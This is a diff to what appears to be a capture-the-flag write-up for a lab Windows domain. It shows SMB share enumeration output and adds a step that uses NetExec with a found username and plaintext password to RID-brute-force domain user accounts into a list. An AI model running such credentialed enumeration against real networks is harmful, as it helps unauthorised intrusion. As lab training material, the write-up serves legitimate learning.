@@ -253,5 +253,11 @@ SMB         10.129.229.57   445    RESEARCH         RedirectedFolders$ READ,WRIT
 SMB         10.129.229.57   445    RESEARCH         SYSVOL          READ            Logon server share
 ```
 
+## Users
+
+```python
+nxc smb research.search.htb -u hope.sharp -p 'IsolationIsKey?' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt
+```
+Ill use this command to output all the user to a full userlist
 
 
